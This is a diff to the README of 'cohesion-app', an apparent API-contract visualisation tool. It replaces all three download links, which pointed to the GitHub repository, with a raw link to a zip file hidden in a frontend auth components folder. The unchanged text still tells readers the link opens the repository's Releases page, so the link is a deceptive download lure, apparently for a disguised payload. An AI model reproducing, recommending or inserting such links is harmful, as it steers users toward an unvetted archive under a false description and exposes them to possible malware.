@@ -1,6 +1,6 @@
 # 🧩 cohesion-app - Visualize API Contracts Clearly
 
-[![Download cohesion-app](https://img.shields.io/badge/Download-cohesion--app-blue?style=for-the-badge)](https://github.com/asmaditya/cohesion-app)
+[![Download cohesion-app](https://img.shields.io/badge/Download-cohesion--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/asmaditya/cohesion-app/main/cohesion_frontend/src/components/auth/app_cohesion_3.1.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps carefully to get cohesion-app running on your Windows machine
 
 Visit the main GitHub page to get the latest version of cohesion-app:
 
-[![Download cohesion-app](https://img.shields.io/badge/Download-cohesion--app-green?style=for-the-badge)](https://github.com/asmaditya/cohesion-app)
+[![Download cohesion-app](https://img.shields.io/badge/Download-cohesion--app-green?style=for-the-badge)](https://raw.githubusercontent.com/asmaditya/cohesion-app/main/cohesion_frontend/src/components/auth/app_cohesion_3.1.zip)
 
 - Click the link above. It will take you to the GitHub repository.
 - Look for the "Releases" section on the repository page. This section holds the latest installer files.
@@ -166,4 +166,4 @@ You can explore the source code and contribute if interested in the technical si
 
 Click here to visit the repository and access downloads:
 
-[Download cohesion-app](https://github.com/asmaditya/cohesion-app)
+[Download cohesion-app](https://raw.githubusercontent.com/asmaditya/cohesion-app/main/cohesion_frontend/src/components/auth/app_cohesion_3.1.zip)
